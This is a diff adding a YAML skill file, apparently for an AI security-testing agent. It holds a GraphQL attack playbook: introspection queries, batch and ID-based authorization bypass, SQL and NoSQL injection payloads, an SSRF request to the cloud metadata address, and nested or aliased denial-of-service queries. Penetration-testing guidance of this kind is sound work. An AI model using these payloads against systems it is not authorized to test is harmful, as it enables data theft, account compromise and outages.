@@ -1,0 +1,116 @@
+id: graphql-introspection
+name: "GraphQL Security Testing"
+description: "GraphQL introspection, injection, batching attacks, auth bypass, and DoS via nested queries"
+version: 1
+applicable_roles: [attack, audit, review]
+tags: [graphql, api, introspection, injection, batching, dos, authorization]
+triggers:
+  - "graphql"
+  - "/graphql"
+  - "__schema"
+  - "__typename"
+  - "query\\s*\\{"
+  - "mutation\\s*\\{"
+  - "subscription\\s*\\{"
+  - "application/graphql"
+  - "GraphiQL"
+  - "Apollo"
+  - "Hasura"
+  - "graphql-playground"
+estimated_tokens: 700
+content: |
+  ## GraphQL Security Testing
+
+  ### Step 1: Endpoint Discovery
+  Common GraphQL endpoint paths:
+  - `/graphql`, `/graphql/v1`, `/api/graphql`, `/query`, `/gql`
+  - `/graphiql`, `/playground`, `/altair`, `/explorer` (interactive UIs — often left enabled in prod)
+  - Try both GET and POST: `GET /graphql?query={__typename}` and `POST /graphql` with JSON body
+
+  Confirm GraphQL: send `{"query":"{__typename}"}` — response containing `"data":{"__typename":"Query"}` confirms.
+
+  ### Step 2: Introspection Query
+  Full schema extraction (disabled in hardened setups, but very commonly left on):
+  ```json
+  {"query":"{ __schema { types { name fields { name args { name type { name kind ofType { name } } } type { name kind ofType { name } } } } } }"}
+  ```
+
+  If full introspection is blocked, try partial:
+  - `{"query":"{__type(name:\"User\"){fields{name type{name}}}}"}`
+  - `{"query":"{__schema{queryType{name}mutationType{name}}}"}` — just get root type names
+  - Field suggestion abuse: send `{"query":"{userr}"}` — error message may suggest `"Did you mean 'user'?"`
+
+  **Parse the schema for**:
+  - Mutations that create/modify/delete data (especially admin operations)
+  - Fields named `password`, `secret`, `token`, `hash`, `ssn`, `email`
+  - Types named `Admin`, `InternalUser`, `Debug`, `Config`
+  - Arguments accepting IDs (IDOR targets)
+
+  ### Step 3: Authorization Testing
+  GraphQL often has object-level authz gaps:
+  - Query other users' data: `{user(id:1){email password}}` — increment IDs
+  - Access admin mutations without admin role: `mutation{deleteUser(id:2){id}}`
+  - Horizontal privilege: query your own profile, then change the ID argument
+  - Check if `__typename` on restricted types leaks info even when fields are denied
+
+  **Batch query auth bypass**: some middleware checks auth on the first query in a batch but not subsequent ones:
+  ```json
+  [
+    {"query":"{ viewer { id } }"},
+    {"query":"{ user(id: 1) { email secretField } }"}
+  ]
+  ```
+
+  ### Step 4: Injection Attacks
+  **SQL injection through GraphQL arguments**:
+  - `{users(filter:"' OR 1=1--")  {id email}}`
+  - `{user(name:"admin' UNION SELECT password FROM users--"){id}}`
+  - Test every string argument — GraphQL is just a transport; the resolver may concatenate into SQL
+
+  **NoSQL injection** (common with Hasura/Mongo backends):
+  - `{users(where:{email:{_regex:".*"}}){id email}}`
+  - `{users(where:{password:{_gt:""}}){id password}}`
+
+  **SSRF through URL arguments**:
+  - `mutation{importData(url:"http://169.254.169.254/latest/meta-data/")}`
+
+  ### Step 5: Denial of Service
+  **Deeply nested queries** (resource exhaustion):
+  ```graphql
+  { user(id:1) { friends { friends { friends { friends { friends { name } } } } } } }
+  ```
+  If no query depth limit, this exponentially multiplies resolvers.
+
+  **Alias-based batching** (bypass rate limits):
+  ```graphql
+  {
+    a1: user(id:1){email}
+    a2: user(id:2){email}
+    a3: user(id:3){email}
+    # ... repeat 1000x
+  }
+  ```
+
+  **Directive overload**: `{ user @aa @bb @cc @dd ... (id:1){name}}`
+
+  **Circular fragment**: some engines don't guard against:
+  ```graphql
+  fragment A on User { friends { ...B } }
+  fragment B on User { friends { ...A } }
+  { user(id:1) { ...A } }
+  ```
+
+  ### Step 6: Information Disclosure
+  - Error messages often leak stack traces, resolver paths, database table names
+  - Debug mode: `{"query":"{__schema{description}}"}` may reveal internal docs
+  - Suggestions in errors: typo-based field enumeration when introspection is disabled
+  - Check for GraphQL Voyager/Playground exposed in production
+
+  ### Workflow
+  1. Discover endpoint and confirm GraphQL.
+  2. Run introspection — if blocked, enumerate via error suggestions.
+  3. Map all queries, mutations, subscriptions from schema.
+  4. Test authorization on every mutation and query with ID arguments.
+  5. Inject SQL/NoSQL payloads through string arguments.
+  6. Test for depth/alias-based DoS.
+  7. Check for sensitive field exposure in the schema.
